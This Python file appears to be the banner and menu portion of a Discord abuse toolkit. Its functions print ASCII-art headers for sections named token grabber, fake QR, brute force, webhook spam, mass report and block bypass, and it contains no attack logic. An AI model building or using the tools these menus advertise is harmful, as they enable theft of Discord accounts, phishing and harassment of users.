import requests
import os
import sys
import time
import random
import os.path
import string
import subprocess
import pyperclip
import pyautogui
import urllib.request
import random
import threading
import ctypes
import base64
import discord
import json
import datetime
import shutil
import aiohttp
import asyncio
from colorama import Fore, init
from dhooks import Webhook
from selenium import webdriver
from PIL import Image
from bs4 import BeautifulSoup
import requests as req
from threading import Thread as thr
from discord.ext import commands
from discord.ext.commands import Bot
from plyer import notification
from datetime import datetime
from pypresence import Presence
from discord import Webhook, AsyncWebhookAdapter

ctypes.windll.kernel32.SetConsoleTitleW("[Discord] All tools in One - Home")
y = Fore.LIGHTYELLOW_EX
b = Fore.LIGHTBLUE_EX

def Spinner():
	l = ['|', '/', '-', '\\']
	for i in l+l+l:
		sys.stdout.write(f"""\r{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Loading... {i}""")
		sys.stdout.flush()
		time.sleep(0.2)

def astraahome():
    print(f"""\n\n                   {b}█████{y}╗ {b}███████{y}╗{b}████████{y}╗{b}██████{y}╗  {b}█████{y}╗  {b}█████{y}╗ {b}██{y}╗  {b}██{y}╗ {b}██████{y}╗ {b}███{y}╗   {b}███{y}╗{b}███████{y}╗""")
    print(f"""                  {b}██{y}╔══{b}██{y}╗{b}██{y}╔════╝╚══{b}██{y}╔══╝{b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}║  {b}██{y}║{b}██{y}╔═══{b}██{y}╗{b}████{y}╗ {b}████{y}║{b}██{y}╔════╝""")
    print(f"""                  {b}███████{y}║{b}███████{y}╗   {b}██{y}║   {b}██████{y}╔╝{b}███████{y}║{b}███████{y}║{b}███████{y}║{b}██{y}║   {b}██{y}║{b}██{y}╔{b}████{y}╔{b}██{y}║{b}█████{y}╗  """)
    print(f"""                  {b}██{y}╔══{b}██{y}║╚════{b}██{y}║   {b}██{y}║   {b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}║{b}██{y}╔══{b}██{y}║{b}██{y}╔══{b}██{y}║{b}██{y}║   {b}██{y}║{b}██{y}║╚{b}██{y}╔╝{b}██{y}║{b}██{y}╔══╝  """)
    print(f"""                  {b}██{y}║  {b}██{y}║{b}███████{y}║   {b}██{y}║   {b}██{y}║  {b}██{y}║{b}██{y}║  {b}██{y}║{b}██{y}║  {b}██{y}║{b}██{y}║  {b}██{y}║╚{b}██████{y}╔╝{b}██{y}║ ╚═╝ {b}██{y}║{b}███████{y}╗""")
    print(f"""                  ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝\n""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{Fore.LIGHTWHITE_EX }ev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://as""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------\n""")
                       
def blockbypass():
    print(f"""\n\n                {b}██████{y}╗ {b}██{y}╗      {b}██████{y}╗  {b}██████{y}╗{b}██{y}╗  {b}██{y}╗{b}██████{y}╗ {b}██{y}╗   {b}██{y}╗{b}██████{y}╗  {b}█████{y}╗ {b}███████{y}╗{b}███████{y}╗""")
    print(f"""                {b}██{y}╔══{b}██{y}{b}╗██{y}║     {b}██{y}╔═══{b}██{y}╗{b}██{y}╔════╝{b}██{y}║ {b}██{y}╔╝{b}██{y}╔══{b}██{y}╗╚{b}██{y}╗ {b}██{y}╔╝{b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}╔════╝{b}██{y}╔════╝""")
    print(f"""                {b}██████{y}╔╝{b}██{y}║     {b}██{y}║   {b}██{y}║{b}██{y}║     {b}█████{y}╔╝ {b}██████{y}╔╝ ╚{b}████{y}╔╝ {b}██████{y}╔╝{b}███████{y}║{b}███████{y}╗{b}███████{y}╗""")
    print(f"""                {b}██{y}╔══{b}██{y}╗{b}██{y}║     {b}██{y}║   {b}██{y}║{b}██{y}║     {b}██{y}╔═{b}██{y}╗ {b}██{y}╔══{b}██{y}╗  ╚{b}██{y}╔╝  {b}██{y}╔═══╝ {b}██{y}╔══{b}██{y}║╚════{b}██{y}║╚═══{b}═██{y}║""")
    print(f"""                {b}██████{y}╔╝{b}███████{y}╗╚{b}██████{y}╔╝╚{b}██████{y}╗{b}██{y}║  {b}██{y}╗{b}██████{y}╔╝   {b}██{y}║   {b}██{y}║     {b}██{y}║  {b}██{y}║{b}███████{y}║{b}███████{y}║""")
    print(f"""                ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝\n""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{Fore.LIGHTWHITE_EX }ev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://as""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------\n""")

def tokengen():
    print(f"""\n                        {b}████████{y}╗ {b}██████{y}╗ {b}██{y}╗  {b}██{y}╗{b}███████{y}╗{b}███{y}╗   {b}██{y}╗ {b}██████{y}╗ {b}███████{y}╗{b}███{y}╗   {b}██{y}╗""")
    print(f"""                        {y}╚══{b}██{y}╔══╝{b}██{y}╔═══{b}██{y}╗{b}██{y}║ {b}██{y}╔╝{b}██{y}╔════╝{b}████{y}╗  {b}██{y}║{b}██{y}╔════╝ {b}██{y}╔════╝{b}████{y}╗  {b}██{y}║""")
    print(f"""                           {b}██{y}║   {b}██{y}║   {b}██{y}║{b}█████{y}╔╝ {b}█████{y}╗  {b}██{y}╔{b}██{y}╗ {b}██{y}║{b}██{y}║  {b}███{y}╗{b}█████{y}╗  {b}██{y}╔{b}██{y}╗ {b}██{y}║""")
    print(f"""                          {b} ██{y}║   {b}██{y}║   {b}██{y}║{b}██{y}╔═{b}██{y}╗ {b}██{y}╔══╝  {b}██{y}║╚{b}██{y}╗{b}██{y}║{b}██{y}║   {b}██{y}║{b}██{y}╔══╝  {b}██{y}║╚{b}██{y}╗{b}██{y}║""")
    print(f"""                           {b}██{y}║   ╚{b}██████{y}╔╝{b}██{y}║  {b}██{y}╗{b}███████{y}╗{b}██{y}║ ╚{b}████{y}║╚{b}██████{y}╔╝{b}███████{y}╗{b}██{y}║ ╚{b}████{y}║""")
    print(f"""                           ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝\n""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{Fore.LIGHTWHITE_EX }ev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://as""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------\n""")

def nitrogen():
    print(f"""\n                           {b}███{y}╗   {b}██{y}╗{b}██{y}╗{b}████████{y}╗{b}██████{y}╗  {b}██████{y}╗ {b} ██████{y}╗ {b}███████{y}╗{b}███{y}╗   {b}██{y}╗""")
    print(f"""                           {b}████{y}╗  {b}██{y}║{b}██{y}║╚══{b}██{y}╔══╝{b}██{y}╔══{b}██{y}╗{b}██{y}╔═══{b}██{y}╗{b}██{y}╔════╝ {b}██{y}╔════╝{b}████{y}╗  {b}██{y}║""")
    print(f"""                           {b}██{y}╔{b}██{y}╗ {b}██{y}║{b}██{y}║   {b}██{y}║   {b}██████{y}╔╝{b}██{y}║   {b}██{y}║{b}██{y}║  {b}███{y}╗{b}█████{y}╗  {b}██{y}╔{b}██{y}╗ {b}██{y}║""")
    print(f"""                           {b}██{y}║╚{b}██{y}╗{b}██{y}║{b}██{y}║   {b}██{y}║   {b}██{y}╔══{b}██{y}╗{b}██{y}║   {b}██{y}║{b}██{y}║   {b}██{y}║{b}██{y}╔══╝  {b}██{y}║╚{b}██{y}╗{b}██{y}║""")
    print(f"""                           {b}██{y}║ ╚{b}████{y}║{b}██{y}║   {b}██{y}║   {b}██{y}║  {b}██{y}║╚{b}██████{y}╔╝╚{b}██████{y}╔╝{b}███████{y}╗{b}██{y}║ ╚{b}████{y}║""")
    print(f"""                           ╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝\n""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{Fore.LIGHTWHITE_EX }ev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://as""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------\n""")

def autologin():
    print(f"""\n\n                         {b}█████{y}╗ {b}██{y}╗   {b}██{y}╗{b}████████{y}╗ {b}██████{y}╗ {b}██{y}╗      {b}██████{y}╗  {b}██████{y}╗ {b}██{y}╗{b}███{y}╗   {b}██{y}╗""")
    print(f"""                        {b}██{y}╔══{b}██{y}╗{b}██{y}║   {b}██{y}║╚══{b}██{y}╔══╝{b}██{y}╔═══{b}██{y}╗{b}██{y}║     {b}██{y}╔═══{b}██{y}╗{b}██{y}╔════╝ {b}██{y}║{b}████{y}╗  {b}██{y}║""")
    print(f"""                        {b}███████{y}║{b}██{y}║   {b}██{y}║   {b}██{y}║   {b}██{y}║   {b}██{y}║{b}██{y}║     {b}██{y}║   {b}██{y}║{b}██{y}║  {b}███{y}╗{b}██{y}║{b}██{y}╔{b}██{y}╗ {b}██{y}║""")
    print(f"""                        {b}██{y}╔══{b}██{y}║{b}██{y}║   {b}██{y}║   {b}██{y}║   {b}██{y}║   {b}██{y}║{b}██{y}║     {b}██{y}║   {b}██{y}║{b}██{y}║   {b}██{y}║{b}██{y}║{b}██{y}║╚{b}██{y}╗{b}██{y}║""")
    print(f"""                        {b}██{y}║  {b}██{y}║╚{b}██████{y}╔╝   {b}██{y}║   ╚{b}██████{y}╔╝{b}███████{y}╗╚{b}██████{y}╔╝╚{b}██████{y}╔╝{b}██{y}║{b}██{y}║ ╚{b}████{y}║""")
    print(f"""                        ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝\n""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{Fore.LIGHTWHITE_EX }ev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://as""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------\n""")

def tokeninfo():
    print(f"""\n\n                        {b}████████{y}╗ {b}██████{y}╗ {b}██{y}╗  {b}██{y}╗{b}███████{y}╗{b}███{y}╗   {b}██{y}╗{b}██{y}╗{b}███{y}╗   {b}██{y}╗{b}███████{y}╗ {b}██████{y}╗ """)
    print(f"""                        {y}╚══{b}██{y}╔══╝{b}██{y}╔═══{b}██{y}╗{b}██{y}║ {b}██{y}╔╝{b}██{y}╔════╝{b}████{y}╗  {b}██{y}║{b}██{y}║{b}████{y}╗  {b}██{y}║{b}██{y}╔════╝{b}██{y}╔═══{b}██{y}╗""")
    print(f"""                           {b}██{y}║   {b}██{y}║   {b}██{y}║{b}█████{y}╔╝ {b}█████{y}╗  {b}██{y}╔{b}██{y}╗ {b}██{y}║{b}██{y}║{b}██{y}╔{b}██{y}╗ {b}██{y}║{b}█████{y}╗  {b}██{y}║   {b}██{y}║""")
    print(f"""                           {b}██{y}║   {b}██{y}║   {b}██{y}║{b}██{y}╔═{b}██{y}╗ {b}██{y}╔══╝  {b}██{y}║╚{b}██{y}╗{b}██{y}║{b}██{y}║{b}██{y}║╚{b}██{y}╗{b}██{y}║{b}██{y}╔══╝  {b}██{y}║   {b}██{y}║""")
    print(f"""                           {b}██{y}║   ╚{b}██████{y}╔╝{b}██{y}║  {b}██{y}╗{b}███████{y}╗{b}██{y}║ ╚{b}████{y}║{b}██{y}║{b}██{y}║ ╚{b}████{y}║{b}██{y}║     {y}╚{b}██████{y}╔╝""")
    print(f"""                           ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ \n""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{Fore.LIGHTWHITE_EX }ev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://as""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------\n""")

def tokenrape():
    print(f"""\n\n                     {b}████████{y}╗ {b}██████{y}╗ {b}██{y}╗  {b}██{y}╗{b}███████{y}╗{b}███{y}╗   {b}██{y}╗{b}██████{y}╗  {b}█████{y}╗ {b}██████{y}╗ {b}███████{y}╗""")
    print(f"""                     {y}╚══{b}██{y}╔══╝{b}██{y}╔═══{b}██{y}╗{b}██{y}║ {b}██{y}╔╝{b}██{y}╔════╝{b}████{y}╗  {b}██{y}║{b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}╔════╝""")
    print(f"""                        {b}██{y}║   {b}██{y}║   {b}██{y}║{b}█████{y}╔╝ {b}█████{y}╗  {b}██{y}╔{b}██{y}╗ {b}██{y}║{b}██████{y}╔╝{b}███████{y}║{b}██████{y}╔╝{b}█████{y}╗  """)
    print(f"""                        {b}██{y}║   {b}██{y}║   {b}██{y}║{b}██{y}╔═{b}██{y}╗ {b}██{y}╔══╝  {b}██{y}║╚{b}██{y}╗{b}██{y}║{b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}║{b}██{y}╔═══╝ {b}██{y}╔══╝  """)
    print(f"""                        {b}██{y}║   ╚{b}██████{y}╔╝{b}██{y}║  {b}██{y}╗{b}███████{y}╗{b}██{y}║ ╚{b}████{y}║{b}██{y}║  {b}██{y}║{b}██{y}║  {b}██{y}║{b}██{y}║     {b}███████{y}╗""")
    print(f"""                        ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝\n""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{Fore.LIGHTWHITE_EX }ev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://as""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------\n""")

def brutforce():
    print(f"""\n\n                        {b}██████{y}╗ {b}██████{y}╗ {b}██{y}╗   {b}██{y}╗{b}████████{y}╗{b}███████{y}╗ {b}██████{y}╗ {b}██████{y}╗  {b}██████{y}╗{b}███████{y}╗""")
    print(f"""                        {b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}║   {b}██{y}║╚══{b}██{y}╔══╝{b}██{y}╔════╝{b}██{y}╔═══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}╔════╝{b}██{y}╔════╝""")
    print(f"""                        {b}██████{y}╔╝{b}██████{y}╔╝{b}██{y}║   {b}██{y}║   {b}██{y}║   {b}█████{y}╗  {b}██{y}║   {b}██{y}║{b}██████{y}╔╝{b}██{y}║     {b}█████{y}╗  """)
    print(f"""                        {b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}║   {b}██{y}║   {b}██{y}║   {b}██{y}╔══╝  {b}██{y}║   {b}██{y}║{b}██{y}╔══{b}██{y}╗{b}██{y}║     {b}██{y}╔══╝  """)
    print(f"""                        {b}██████{y}╔╝{b}██{y}║  {b}██{y}║╚{b}██████{y}╔╝   {b}██{y}║   {b}██{y}║     ╚{b}██████{y}╔╝{b}██{y}║  {b}██{y}║╚{b}██████{y}╗{b}███████{y}╗""")
    print(f"""                        ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝\n""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{Fore.LIGHTWHITE_EX }ev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://as""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------\n""")

def fakeqr():
    print(f"""\n\n                                   {b}███████{y}╗ {b}█████{y}╗ {b}██{y}╗  {b}██{y}╗{b}███████{y}╗     {b}██████{y}╗ {b}██████{y}╗ """)
    print(f"""                                   {b}██{y}╔════╝{b}██{y}╔══{b}██{y}╗{b}██{y}║ {b}██{y}╔╝{b}██{y}╔════╝    {b}██{y}╔═══{b}██{y}╗{b}██{y}╔══{b}██{y}╗""")
    print(f"""                                   {b}█████{y}╗  {b}███████{y}║{b}█████{y}╔╝ {b}█████{y}╗      {b}██{y}║   {b}██{y}║{b}██████{y}╔╝""")
    print(f"""                                   {b}██{y}╔══╝  {b}██{y}╔══{b}██{y}║{b}██{y}╔═{b}██{y}╗ {b}██{y}╔══╝      {b}██{y}║{b}▄▄ ██{y}║{b}██{y}╔══{b}██{y}╗""")
    print(f"""                                   {b}██{y}║     {b}██{y}║  {b}██{y}║{b}██{y}║  {b}██{y}╗{b}███████{y}╗    ╚{b}██████{y}╔╝{b}██{y}║  {b}██{y}║""")
    print(f"""                                   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝     ╚══{b}▀▀{y}═╝ ╚═╝  ╚═╝\n""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{Fore.LIGHTWHITE_EX }ev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://as""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------\n""")

def tokengrabber():
    print(f"""\n\n         {b}████████{y}╗ {b}██████{y}╗ {b}██{y}╗ {b}███{y}╗{b}███████{y}╗{b}███{y}╗   {b}██{y}╗     {b}██████{y}╗ {b}██████{y}╗  {b}█████{y}╗ {b}██████{y}╗ {b}██████{y}╗ {b}███████{y}╗{b}██████{y}╗ """)
    print(f"""         {y}╚══{b}██{y}╔══╝{b}██{y}╔═══{b}██{y}╗{b}██{y}║ {b}██{y}╔╝{b}██{y}╔════╝{b}████{y}╗  {b}██{y}║    {b}██{y}╔════╝ {b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}╔════╝{b}██{y}╔══{b}██{y}╗""")
    print(f"""            {b}██{y}║   {b}██{y}║   {b}██{y}║{b}█████{y}╔╝ {b}█████{y}╗  {b}██{y}╔{b}██{y}╗ {b}██{y}║    {b}██{y}║  {b}███{y}╗{b}██████{y}╔╝{b}███████{y}║{b}██████{y}╔╝{b}██████{y}╔╝{b}█████{y}╗  {b}██████{y}╔╝""")
    print(f"""            {b}██{y}║   {b}██{y}║   {b}██{y}║{b}██{y}╔═{b}██{y}╗ {b}██{y}╔══╝  {b}██{y}║╚{b}██{y}╗{b}██{y}║    {b}██{y}║   {b}██{y}║{b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}║{b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}██{y}╔══╝  {b}██{y}╔══{b}██{y}╗""")
    print(f"""            {b}██{y}║   ╚{b}██████{y}╔╝{b}██{y}║  {b}██{y}╗{b}███████{y}╗{b}██{y}║ ╚{b}████{y}║    ╚{b}██████{y}╔╝{b}██{y}║  {b}██{y}║{b}██{y}║  {b}██{y}║{b}██████{y}╔╝{b}██████{y}╔╝{b}███████{y}╗{b}██{y}║  {b}██{y}║""")
    print(f"""            ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝\n""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{Fore.LIGHTWHITE_EX }ev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://as""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------\n""")

def webhookspam():
    print(f"""\n\n            {b}██{y}╗    {b}██{y}╗{b}███████{y}╗{b}██████{y}╗ {b}██{y}╗  {b}██{y}╗ {b}██████{y}╗  {b}██████{y}╗{b} ██{y}╗  {b}██{y}╗    {b}███████{y}╗{b}██████{y}╗  {b}█████{y}╗ {b}███{y}╗   {b}███{y}╗""")
    print(f"""            {b}██{y}║    {b}██{y}║{b}██{y}╔════╝{b}██{y}╔══{b}██{y}╗{b}██{y}║  {b}██{y}║{b}██{y}╔═══{b}██{y}╗{b}██{y}╔═══{b}██{y}╗{b}██{y}║ {b}██{y}╔╝    {b}██{y}╔════╝{b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}╗{b}████{y}╗ {b}████{y}║""")
    print(f"""            {b}██{y}║ {b}█{y}╗ {b}██{y}║{b}█████{y}╗  {b}██████{y}╔╝{b}███████{y}║{b}██{y}║   {b}██{y}║{b}██{y}║   {b}██{y}║{b}█████{y}╔╝     {b}███████{y}╗{b}██████{y}╔╝{b}███████{y}║{b}██{y}╔{b}████{y}╔{b}██{y}║""")
    print(f"""           {b} ██{y}║{b}███{y}╗{b}██{y}║{b}██{y}╔══╝  {b}██{y}╔══{b}██{y}╗{b}██{y}╔══{b}██{y}║{b}██{y}║   {b}██{y}║{b}██{y}║   {b}██{y}║{b}██{y}╔═{b}██{y}╗     ╚════{b}██{y}║{b}██{y}╔═══╝ {b}██{y}╔══{b}██{y}║{b}██{y}║╚{b}██{y}╔╝{b}██{y}║""")
    print(f"""            {y}╚{b}███{y}╔{b}███{y}╔╝{b}███████{y}╗{b}██████{y}╔╝{b}██{y}║  {b}██{y}║╚{b}██████{y}╔╝╚{b}██████{y}╔╝{b}██{y}║  {b}██{y}╗    {b}███████{y}║{b}██{y}║     {b}██{y}║  {b}██{y}║{b}██{y}║ ╚═╝ {b}██{y}║""")
    print(f"""             ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝\n""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------""")
    print(f"""{Fore.LIGHTWHITE_EX }ev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://astraadev.club/ {Fore.LIGHTBLUE_EX }|{Fore.LIGHTWHITE_EX } http://as""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------\n""")

def massreport():
    print(f"""\n\n                  {b}███{y}╗   {b}███{y}╗ {b}█████{y}╗ {b}███████{y}╗{b}███████{y}╗    {b}██████{y}╗ {b}███████{y}╗{b}██████{y}╗  {b}██████{y}╗ {b}██████{y}╗ {b}████████{y}╗""")
    print(f"""                 {b} ████{y}╗ {b}████{y}║{b}██{y}╔══{b}██{y}╗{b}██{y}╔════╝{b}██{y}╔════╝    {b}██{y}╔══{b}██{y}╗{b}██{y}╔════╝{b}██{y}╔══{b}██{y}╗{b}██{y}╔═══{b}██{y}╗{b}██{y}╔══{b}██{y}╗╚══{b}██{y}╔══╝""")
    print(f"""                  {b}██{y}╔{b}████{y}╔{b}██{y}║{b}███████{y}║{b}███████{y}╗{b}███████{y}╗    {b}██████{y}╔╝{b}█████{y}╗  {b}██████{y}╔╝{b}██{y}║   {b}██{y}║{b}██████{y}╔╝   {b}██{y}║   """)
    print(f"""                  {b}██{y}║╚{b}██{y}╔╝{b}██{y}║{b}██{y}╔══{b}██{y}║╚════{b}██{y}║╚════{b}██{y}║    {b}██{y}╔══{b}██{y}╗{b}██{y}╔══╝  {b}██{y}╔═══╝ {b}██{y}║   {b}██{y}║{b}██{y}╔══{b}██{y}╗   {b}██{y}║   """)
    print(f"""                 {b} ██{y}║ ╚═╝ {b}██{y}║{b}██{y}║  {b}██{y}║{b}███████{y}║{b}███████{y}║    {b}██{y}║  {b}██{y}║{b}███████{y}╗{b}██{y}║     ╚{b}██████{y}╔╝{b}██{y}║  {b}██{y}║   {b}██{y}║   """)
    print(f"""                  ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   \n""")
    print(f"""{Fore.LIGHTYELLOW_EX }------------------------------------------------------------------------------------------------------------------------""")
